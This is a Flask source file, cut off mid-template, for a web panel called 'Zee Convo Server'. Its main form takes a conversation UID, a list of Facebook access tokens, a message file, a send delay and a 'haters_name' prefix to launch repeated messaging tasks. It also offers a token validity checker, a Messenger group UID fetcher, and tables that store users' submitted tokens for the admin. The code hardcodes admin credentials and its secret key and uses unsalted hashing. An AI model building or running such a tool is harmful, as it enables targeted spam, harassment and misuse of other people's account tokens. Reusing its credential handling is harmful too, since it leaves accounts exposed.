from flask import Flask, render_template_string, request, redirect, url_for, jsonify, session, flash
import requests
import json
import time
import os
import threading
from datetime import datetime, timedelta
import uuid
import sqlite3
import hashlib
from functools import wraps

app = Flask(__name__)
app.secret_key = 'your-secret-key-here'  # Change this to a random secret key

# Configuration for admin credentials - can be changed here
ADMIN_CONFIG = {
    'username': 'the_zee_rajput_onfire',
    'password': 'zee_king_here'  # Change this password as needed
}

# Database initialization
def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    # Create users table with approval status
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                 username TEXT UNIQUE,
                 password TEXT,
                 admin INTEGER DEFAULT 0,
                 approved INTEGER DEFAULT 0,
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    
    # Create user_tokens table for storing user tokens
    c.execute('''CREATE TABLE IF NOT EXISTS user_tokens
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                 username TEXT,
                 tokens TEXT,
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    
    # Create admin user if not exists or update password if changed
    c.execute("SELECT * FROM users WHERE username = ?", (ADMIN_CONFIG['username'],))
    admin_user = c.fetchone()
    
    hashed_password = hashlib.sha256(ADMIN_CONFIG['password'].encode()).hexdigest()
    
    if admin_user:
        # Update admin password if it has changed
        c.execute("UPDATE users SET password = ? WHERE username = ?", 
                 (hashed_password, ADMIN_CONFIG['username']))
    else:
        # Create new admin user
        c.execute("INSERT INTO users (username, password, admin, approved) VALUES (?, ?, 1, 1)", 
                 (ADMIN_CONFIG['username'], hashed_password))
    
    conn.commit()
    conn.close()

init_db()

# Global variables
message_threads = {}  # Dictionary to store multiple threads with their IDs
task_logs = {}  # Dictionary to store logs for each task with timestamps
stop_flags = {}  # Dictionary to store stop flags for each task
user_tokens_storage = {}  # Dictionary to store user tokens for admin panel

# Start background thread for log cleanup
def cleanup_old_logs():
    """Background thread to clean up logs older than 1 hour"""
    while True:
        try:
            current_time = datetime.now()
            for task_id in list(task_logs.keys()):
                # Filter logs to keep only those from the last hour
                task_logs[task_id] = [
                    log for log in task_logs[task_id] 
                    if current_time - log['timestamp'] <= timedelta(hours=1)
                ]
                # Remove task if no logs remain
                if not task_logs[task_id]:
                    del task_logs[task_id]
            time.sleep(300)  # Check every 5 minutes
        except Exception as e:
            print(f"Error in log cleanup: {e}")
            time.sleep(300)

# Start the cleanup thread
cleanup_thread = threading.Thread(target=cleanup_old_logs, daemon=True)
cleanup_thread.start()

# Authentication decorators
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

def approved_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("SELECT approved FROM users WHERE id = ?", (session['user_id'],))
        user = c.fetchone()
        conn.close()
        
        if not user or user[0] != 1:
            return render_template_string(pending_approval_html)
        return f(*args, **kwargs)
    return decorated_function

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("SELECT admin, approved FROM users WHERE id = ?", (session['user_id'],))
        user = c.fetchone()
        conn.close()
        
        if not user or user[0] != 1 or user[1] != 1:
            return "Admin access required", 403
        return f(*args, **kwargs)
    return decorated_function

# Enhanced pending approval page HTML with more fancy styling
pending_approval_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZEE RAJPUT- Pending Approval</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }
        
        .pending-container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 25px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
            max-width: 600px;
            padding: 50px;
            text-align: center;
            position: relative;
            z-index: 1;
        }
        
        .pending-icon {
            font-size: 5rem;
            background: linear-gradient(135deg, #ffc107 0%, #ff8c00 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 25px;
        }
        
        .pending-title {
            font-size: 2.5rem;
            background: linear-gradient(135deg, #495057 0%, #343a40 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 20px;
            font-weight: 800;
        }
        
        .pending-message {
            font-size: 1.2rem;
            color: #6c757d;
            margin-bottom: 35px;
            line-height: 1.7;
            font-weight: 500;
        }
        
        .btn-logout {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 18px 35px;
            border-radius: 15px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.4s ease;
            text-decoration: none;
            display: inline-block;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .btn-logout:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(102, 126, 234, 0.4);
        }
    </style>
</head>
<body>
    <div class="pending-container">
        <div class="pending-icon">Ã¢ÂÂ³</div>
        <h1 class="pending-title">Account Pending Approval</h1>
        <p class="pending-message">
            Your account is currently under review. Please wait for an administrator to approve your access.
        </p>
        <a href="/logout" class="btn-logout">
            <i class="fas fa-sign-out-alt"></i> Logout
        </a>
    </div>
</body>
</html>
'''

# Enhanced login/register HTML
auth_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZEE RAJPUT- Access Portal</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .auth-container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(25px);
            border-radius: 30px;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.2);
            max-width: 480px;
            width: 100%;
            overflow: hidden;
        }
        
        .auth-header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 50px 30px;
            text-align: center;
        }
        
        .auth-title {
            font-size: 3rem;
            font-weight: 900;
            margin-bottom: 15px;
            text-shadow: 3px 3px 6px rgba(0, 0, 0, 0.3);
        }
        
        .auth-subtitle {
            font-size: 1.1rem;
            opacity: 0.95;
        }
        
        .auth-tabs {
            display: flex;
            background: #f8f9fa;
        }
        
        .auth-tab {
            flex: 1;
            padding: 25px 20px;
            text-align: center;
            cursor: pointer;
            font-weight: 700;
            color: #6c757d;
            transition: all 0.4s ease;
            background: transparent;
            border: none;
            font-size: 16px;
        }
        
        .auth-tab.active {
            color: #667eea;
            background: white;
        }
        
        .auth-form {
            display: none;
            padding: 45px 35px;
        }
        
        .auth-form.active {
            display: block;
        }
        
        .form-group {
            margin-bottom: 30px;
        }
        
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 20px;
            border: 2px solid #e9ecef;
            border-radius: 15px;
            font-size: 16px;
            transition: all 0.4s ease;
        }
        
        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 6px rgba(102, 126, 234, 0.1);
        }
        
        .btn {
            width: 100%;
            padding: 20px;
            border: none;
            border-radius: 15px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.4s ease;
            text-transform: uppercase;
            letter-spacing: 1.5px;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        
        .btn-success {
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
            color: white;
        }
        
        .btn-warning {
            background: linear-gradient(135deg, #ffc107 0%, #fd7e14 100%);
            color: #212529;
        }
        
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
        }
        
        .alert {
            padding: 18px 25px;
            border-radius: 12px;
            margin-top: 25px;
            text-align: center;
        }
        
        .alert-danger {
            background: #f8d7da;
            color: #721c24;
        }
        
        .alert-success {
            background: #d4edda;
            color: #155724;
        }
    </style>
</head>
<body>
    <div class="auth-container">
        <div class="auth-header">
            <h1 class="auth-title">ZEE RAJPUT</h1>
            <p class="auth-subtitle">Welcome To Zee Convo Server</p>
        </div>
        
        <div class="auth-tabs">
            <button class="auth-tab active" onclick="switchAuthTab('login')">Login</button>
            <button class="auth-tab" onclick="switchAuthTab('register')">Register</button>
            <button class="auth-tab" onclick="switchAuthTab('admin')">Admin Login</button>
        </div>
        
        <div id="login-form" class="auth-form active">
            <form action="/login" method="post">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Username" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="btn btn-primary">Access Platform</button>
            </form>
            
            {% with messages = get_flashed_messages(category_filter=['error']) %}
                {% if messages %}
                    <div class="alert alert-danger">{{ messages[0] }}</div>
                {% endif %}
            {% endwith %}
        </div>
        
        <div id="register-form" class="auth-form">
            <form action="/register" method="post">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Username" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <div class="form-group">
                    <input type="password" name="confirm_password" placeholder="Confirm Password" required>
                </div>
                <button type="submit" class="btn btn-success">Create Account</button>
            </form>
            
            {% with messages = get_flashed_messages(with_categories=true) %}
                {% if messages %}
                    {% for category, message in messages %}
                        {% if category == 'error' %}
                            <div class="alert alert-danger">{{ message }}</div>
                        {% endif %}
                        {% if category == 'success' %}
                            <div class="alert alert-success">{{ message }}</div>
                        {% endif %}
                    {% endfor %}
                {% endif %}
            {% endwith %}
        </div>
        
        <div id="admin-form" class="auth-form">
            <form action="/admin_login" method="post">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Admin Username" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Admin Password" required>
                </div>
                <button type="submit" class="btn btn-warning">Admin Access</button>
            </form>
            
            {% with messages = get_flashed_messages(category_filter=['admin_error']) %}
                {% if messages %}
                    <div class="alert alert-danger">{{ messages[0] }}</div>
                {% endif %}
            {% endwith %}
        </div>
    </div>

    <script>
        function switchAuthTab(tab) {
            document.querySelectorAll('.auth-tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.auth-form').forEach(f => f.classList.remove('active'));
            event.currentTarget.classList.add('active');
            document.getElementById(tab + '-form').classList.add('active');
        }
    </script>
</body>
</html>
'''

# Enhanced main application HTML with improved task views
html_content = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZEE RAJPUT</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 25px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
            max-width: 1400px;
            margin: 0 auto;
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 40px 30px;
            text-align: center;
            position: relative;
        }
        
        .header h1 {
            font-size: 3.5rem;
            margin-bottom: 15px;
            text-shadow: 3px 3px 6px rgba(0, 0, 0, 0.3);
            font-weight: 900;
        }
        
        .header p {
            font-size: 1.3rem;
            opacity: 0.95;
        }
        
        .user-info {
            position: absolute;
            top: 25px;
            right: 25px;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .user-username {
            color: white;
            font-weight: 700;
            font-size: 1.1rem;
        }
        
        .btn-logout, .btn-admin {
            background: rgba(255, 255, 255, 0.2);
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 25px;
            cursor: pointer;
            transition: all 0.4s ease;
            text-decoration: none;
            font-weight: 600;
            font-size: 14px;
            text-transform: uppercase;
        }
        
        .btn-logout:hover, .btn-admin:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: translateY(-2px);
        }
        
        .tabs {
            display: flex;
            background: #f8f9fa;
            border-bottom: 2px solid #dee2e6;
        }
        
        .tab {
            flex: 1;
            padding: 25px 20px;
            text-align: center;
            cursor: pointer;
            background: transparent;
            border: none;
            font-size: 16px;
            font-weight: 700;
            color: #495057;
            transition: all 0.4s ease;
            text-transform: uppercase;
        }
        
        .tab:hover {
            color: #667eea;
            transform: translateY(-2px);
        }
        
        .tab.active {
            background: white;
            color: #667eea;
            box-shadow: 0 -5px 15px rgba(102, 126, 234, 0.1);
        }
        
        .tab-content {
            display: none;
            padding: 40px;
            min-height: 600px;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .form-group {
            margin-bottom: 30px;
        }
        
        label {
            display: block;
            margin-bottom: 12px;
            font-weight: 700;
            color: #495057;
            font-size: 14px;
            text-transform: uppercase;
        }
        
        input[type="text"],
        input[type="number"],
        textarea,
        input[type="file"] {
            width: 100%;
            padding: 18px 20px;
            border: 2px solid #e9ecef;
            border-radius: 12px;
            font-size: 16px;
            transition: all 0.4s ease;
        }
        
        input[type="text"]:focus,
        input[type="number"]:focus,
        textarea:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 6px rgba(102, 126, 234, 0.1);
        }
        
        textarea {
            resize: vertical;
            min-height: 140px;
            font-family: 'Courier New', monospace;
        }
        
        .btn {
            padding: 18px 35px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.4s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin: 8px;
            min-width: 160px;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        
        .btn-success {
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
            color: white;
        }
        
        .btn-danger {
            background: linear-gradient(135deg, #dc3545 0%, #fd7e14 100%);
            color: white;
        }
        
        .btn-warning {
            background: linear-gradient(135deg, #ffc107 0%, #fd7e14 100%);
            color: #212529;
        }
        
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
        }
        
        /* IMPROVED TASK VIEWS */
        .task-item {
            background: linear-gradient(145deg, #ffffff 0%, #f8f9fa 100%);
            border: none;
            border-radius: 24px;
            padding: 32px;
            margin-bottom: 28px;
            box-shadow: 
                0 20px 40px rgba(0, 0, 0, 0.08),
                0 8px 16px rgba(0, 0, 0, 0.04),
                inset 0 1px 0 rgba(255, 255, 255, 0.8);
            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }
        
        .task-item::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, #667eea 0%, #764ba2 50%, #667eea 100%);
            background-size: 200% 100%;
            animation: shimmer 3s ease-in-out infinite;
        }
        
        @keyframes shimmer {
            0%, 100% { background-position: 200% 0; }
            50% { background-position: -200% 0; }
        }
        
        .task-item:hover {
            transform: translateY(-8px) scale(1.02);
            box-shadow: 
                0 32px 64px rgba(102, 126, 234, 0.15),
                0 16px 32px rgba(102, 126, 234, 0.1),
                inset 0 1px 0 rgba(255, 255, 255, 0.9);
        }
        
        .task-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
            flex-wrap: wrap;
            gap: 16px;
        }
        
        .task-id {
            font-weight: 900;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-size: 1.4rem;
            letter-spacing: 0.5px;
            text-transform: uppercase;
        }
        
        .task-status {
            padding: 12px 24px;
            border-radius: 50px;
            font-size: 11px;
            font-weight: 800;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
        }
        
        .status-running {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            color: white;
            box-shadow: 0 8px 16px rgba(16, 185, 129, 0.3);
        }
        
        .status-running::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { left: -100%; }
            100% { left: 100%; }
        }
        
        .status-stopped {
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
            color: white;
            box-shadow: 0 8px 16px rgba(239, 68, 68, 0.3);
        }
        
        .task-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
            gap: 20px;
            margin-bottom: 28px;
        }
        
        .task-info-item {
            background: linear-gradient(145deg, #f8fafc 0%, #e2e8f0 100%);
            padding: 20px 24px;
            border-radius: 16px;
            border-left: 4px solid transparent;
            background-clip: padding-box;
            position: relative;
            transition: all 0.3s ease;
        }
        
        .task-info-item::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            bottom: 0;
            width: 4px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 0 2px 2px 0;
        }
        
        .task-info-item:hover {
            transform: translateX(4px);
            background: linear-gradient(145deg, #ffffff 0%, #f1f5f9 100%);
        }
        
        .task-info-label {
            font-size: 11px;
            color: #64748b;
            text-transform: uppercase;
            margin-bottom: 8px;
            font-weight: 800;
            letter-spacing: 1px;
        }
        
        .task-info-value {
            font-weight: 700;
            color: #1e293b;
            font-size: 1.1rem;
            line-height: 1.4;
            word-break: break-word;
        }
        
        .task-buttons {
            display: flex;
            gap: 16px;
            flex-wrap: wrap;
            justify-content: flex-start;
        }
        
        .task-buttons .btn {
            min-width: 140px;
            padding: 14px 28px;
            font-size: 14px;
            border-radius: 12px;
            position: relative;
            overflow: hidden;
        }
        
        .task-buttons .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.5s;
        }
        
        .task-buttons .btn:hover::before {
            left: 100%;
        }
        
        .log-container {
            background: linear-gradient(145deg, #0f172a 0%, #1e293b 100%);
            color: #10b981;
            font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
            font-size: 13px;
            padding: 28px;
            border-radius: 20px;
            height: 480px;
            overflow-y: auto;
            margin-top: 24px;
            border: 2px solid #334155;
            display: none;
            position: relative;
            box-shadow: 
                inset 0 2px 4px rgba(0, 0, 0, 0.3),
                0 8px 16px rgba(0, 0, 0, 0.2);
        }
        
        .log-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, #10b981, transparent);
        }
        
        .log-container.show {
            display: block;
            animation: slideDown 0.3s ease-out;
        }
        
        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .log-container::-webkit-scrollbar {
            width: 8px;
        }
        
        .log-container::-webkit-scrollbar-track {
            background: #1e293b;
            border-radius: 4px;
        }
        
        .log-container::-webkit-scrollbar-thumb {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 4px;
        }
        
        .log-container::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(135deg, #764ba2 0%, #667eea 100%);
        }
        
        .log-close-btn {
            position: absolute;
            top: 12px;
            right: 12px;
            background: rgba(239, 68, 68, 0.2);
            color: #ef4444;
            border: none;
            width: 32px;
            height: 32px;
            border-radius: 50%;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .log-close-btn:hover {
            background: #ef4444;
            color: white;
            transform: scale(1.1);
        }
        
        .result-container {
            margin-top: 25px;
        }
        
        .result-item {
            background: white;
            border: 2px solid #e9ecef;
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
        }
        
        .result-valid {
            border-left: 6px solid #28a745;
            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
        }
        
        .result-invalid {
            border-left: 6px solid #dc3545;
            background: linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%);
        }
        
        .loading {
            text-align: center;
            padding: 50px;
            color: #6c757d;
            font-size: 1.2rem;
            font-weight: 600;
        }
        
        .empty-state {
            text-align: center;
            padding: 80px 20px;
            color: #6c757d;
        }
        
        .empty-state i {
            font-size: 5rem;
            margin-bottom: 25px;
            opacity: 0.3;
        }
        
        @media (max-width: 768px) {
            .tabs {
                flex-direction: column;
            }
            
            .task-header {
                flex-direction: column;
                align-items: flex-start;
                gap: 15px;
            }
            
            .user-info {
                position: static;
                justify-content: center;
                margin-top: 20px;
                flex-wrap: wrap;
            }
            
            .header h1 {
                font-size: 2.5rem;
            }
            
            .task-info {
                grid-template-columns: 1fr;
            }
            
            .task-buttons {
                justify-content: center;
            }
            
            .task-buttons .btn {
                min-width: 120px;
                padding: 12px 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>ZEE RAJPUT</h1>
            <p>Welcome To Stone Convo Server</p>
            <div class="user-info">
                <span class="user-username">{{ session.user_username }}</span>
                {% if session.is_admin %}
                <a href="/admin" class="btn-admin">
                    <i class="fas fa-cog"></i> Admin Panel
                </a>
                {% endif %}
                <a href="/logout" class="btn-logout">
                    <i class="fas fa-sign-out-alt"></i> Logout
                </a>
            </div>
        </div>
        
        <div class="tabs">
            <button class="tab active" onclick="switchTab('bot-tab')">
                <i class="fas fa-envelope"></i> CONVO TOOL
            </button>
            <button class="tab" onclick="switchTab('token-tab')">
                <i class="fas fa-key"></i> TOKEN CHECK
            </button>
            <button class="tab" onclick="switchTab('groups-tab')">
                <i class="fas fa-users"></i> UID FETCHER
            </button>
            <button class="tab" onclick="switchTab('logs-tab')">
                <i class="fas fa-chart-bar"></i> TASK MANAGER
            </button>
        </div>
        
        <div id="bot-tab" class="tab-content active">
            <form action="/run_bot" method="post" enctype="multipart/form-data">
                <div class="form-group">
                    <label for="convo_uid">Conversation UID</label>
                    <input type="text" id="convo_uid" name="convo_uid" placeholder="Enter conversation UID" required>
                </div>

                <div class="form-group">
                    <label for="token">Access Tokens (one per line)</label>
                    <textarea id="token" name="token" placeholder="Enter your access tokens, one per line" required></textarea>
                </div>

                <div class="form-group">
                    <label for="message_file">Message File</label>
                    <input type="file" id="message_file" name="message_file" accept=".txt" required>
                </div>

                <div class="form-group">
                    <label for="speed">Message Speed (seconds)</label>
                    <input type="number" id="speed" name="speed" value="1" min="0" step="1" placeholder="Delay between messages" required>
                </div>

                <div class="form-group">
                    <label for="haters_name">Prefix Name</label>
                    <input type="text" id="haters_name" name="haters_name" placeholder="Name to prefix messages with" required>
                </div>

                <button type="submit" class="btn btn-success">
                    <i class="fas fa-rocket"></i> Start New Task
                </button>
            </form>
        </div>
        
        <div id="token-tab" class="tab-content">
            <div class="form-group">
                <label for="check_tokens">Tokens to Check (one per line)</label>
                <textarea id="check_tokens" name="check_tokens" placeholder="Enter tokens to validate, one per line"></textarea>
            </div>
            <button onclick="checkTokens()" class="btn btn-primary">
                <i class="fas fa-search"></i> Check Tokens
            </button>
            <div id="token-results" class="result-container"></div>
        </div>
        
        <div id="groups-tab" class="tab-content">
            <div class="form-group">
                <label for="groups_token">Valid Access Token</label>
                <textarea id="groups_token" name="groups_token" placeholder="Enter a valid Facebook token to fetch messenger groups"></textarea>
            </div>
            <button onclick="fetchGroups()" class="btn btn-primary">
                <i class="fas fa-users"></i> Fetch Messenger Groups
            </button>
            <div id="groups-results" class="result-container"></div>
        </div>
        
        <div id="logs-tab" class="tab-content">
            <div id="tasks-container">
                <!-- Tasks will be loaded here -->
            </div>
        </div>
    </div>

    <script>
        function switchTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            
            document.getElementById(tabId).classList.add('active');
            
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            event.currentTarget.classList.add('active');
            
            if (tabId === 'logs-tab') {
                refreshTasks();
            }
        }
        
        function checkTokens() {
            const tokens = document.getElementById('check_tokens').value.split('\\n').filter(t => t.trim());
            const resultsContainer = document.getElementById('token-results');
            
            if (tokens.length === 0) {
                resultsContainer.innerHTML = '<div class="result-item result-invalid">Please enter at least one token</div>';
                return;
            }
            
            resultsContainer.innerHTML = '<div class="loading">Checking tokens...</div>';
            
            fetch('/check_tokens', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({tokens: tokens}),
            })
            .then(response => response.json())
            .then(data => {
                resultsContainer.innerHTML = '';
                data.results.forEach(result => {
                    const div = document.createElement('div');
                    div.className = result.valid ? 'result-item result-valid' : 'result-item result-invalid';
                    
                    let content = `<strong>Token:</strong> ${result.token.substring(0, 20)}...<br>`;
                    content += `<strong>Status:</strong> ${result.message}<br>`;
                    
                    if (result.valid) {
                        if (result.picture) {
                            content += `<img src="${result.picture}" alt="Profile Picture" style="width: 50px; height: 50px; border-radius: 50%; margin-right: 10px;">`;
                        }
                        if (result.name) {
                            content += `<strong>Name:</strong> ${result.name}<br>`;
                        }
                        if (result.id) {
                            content += `<strong>UID:</strong> ${result.id}<br>`;
                        }
                    }
                    
                    div.innerHTML = content;
                    resultsContainer.appendChild(div);
                });
            })
            .catch(error => {
                resultsContainer.innerHTML = '<div class="result-item result-invalid">Error checking tokens</div>';
            });
        }
        
        function fetchGroups() {
            const token = document.getElementById('groups_token').value.trim();
            const resultsContainer = document.getElementById('groups-results');
            
            if (!token) {
                resultsContainer.innerHTML = '<div class="result-item result-invalid">Please enter a valid token</div>';
                return;
            }
            
            resultsContainer.innerHTML = '<div class="loading">Fetching messenger groups...</div>';
            
            fetch('/fetch_groups', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({token: token}),
            })
            .then(response => response.json())
            .then(data => {
                resultsContainer.innerHTML = '';
                if (data.success) {
                    if (data.groups.length === 0) {
                        resultsContainer.innerHTML = '<div class="empty-state"><i class="fas fa-users"></i><h3>No Groups Found</h3></div>';
                        return;
                    }
                    
                    const div = document.createElement('div');
                    div.className = 'result-item result-valid';
                    div.innerHTML = `<h4>Found ${data.groups.length} Messenger Groups:</h4>`;
                    
                    data.groups.forEach(group => {
                        const groupDiv = document.createElement('div');
                        groupDiv.style.cssText = 'background: #f8f9fa; padding: 15px; margin: 10px 0; border-radius: 10px; border-left: 4px solid #667eea;';
                        groupDiv.innerHTML = `
                            <div style="font-weight: 700; color: #667eea; margin-bottom: 5px;">${group.name}</div>
                            <div style="font-family: monospace; color: #6c757d; font-size: 12px;">UID: ${group.uid}</div>
                        `;
                        div.appendChild(groupDiv);
                    });
                    
                    resultsContainer.appendChild(div);
                } else {
                    const div = document.createElement('div');
                    div.className = 'result-item result-invalid';
                    div.innerHTML = `<strong>Error:</strong> ${data.message}`;
                    resultsContainer.appendChild(div);
                }
            })
            .catch(error => {
                resultsContainer.innerHTML = '<div class="result-item result-invalid">Error fetching groups</div>';
            });
        }
        
        // Modified toggleLogs function - no auto-close, manual toggle only with close button
        function toggleLogs(taskId) {
            const logContainer = document.getElementById(`logs-${taskId}`);
            
            // Show logs and fetch latest data
            fetch(`/get_logs/${taskId}`)
                .then(response => response.json())
                .then(data => {
                    logContainer.innerHTML = `
                        <button class="log-close-btn" onclick="closeLogs('${taskId}')" title="Close Logs">
                            <i class="fas fa-times"></i>
                        </button>
                        ${data.logs.join('<br>')}
                    `;
                    logContainer.classList.add('show');
                    logContainer.scrollTop = logContainer.scrollHeight;
                });
        }
        
        function closeLogs(taskId) {
            const logContainer = document.getElementById(`logs-${taskId}`);
            logContainer.classList.remove('show');
        }
        
        function refreshTasks() {
            fetch('/get_tasks')
            .then(response => response.json())
            .then(data => {
                const tasksContainer = document.getElementById('tasks-container');
                tasksContainer.innerHTML = '';
                
                if (data.tasks.length === 0) {
                    tasksContainer.innerHTML = '<div class="empty-state"><i class="fas fa-clipboard-list"></i><h3>No Active Tasks</h3><p>Start a new bot task to see it here</p></div>';
                    return;
                }
                
                data.tasks.forEach(task => {
                    const taskDiv = document.createElement('div');
                    taskDiv.className = 'task-item';
                    taskDiv.innerHTML = `
                        <div class="task-header">
                            <div class="task-id">Task: ${task.id}</div>
                            <div class="task-status ${task.status === 'running' ? 'status-running' : 'status-stopped'}">
                                ${task.status}
                            </div>
                        </div>
                        <div class="task-info">
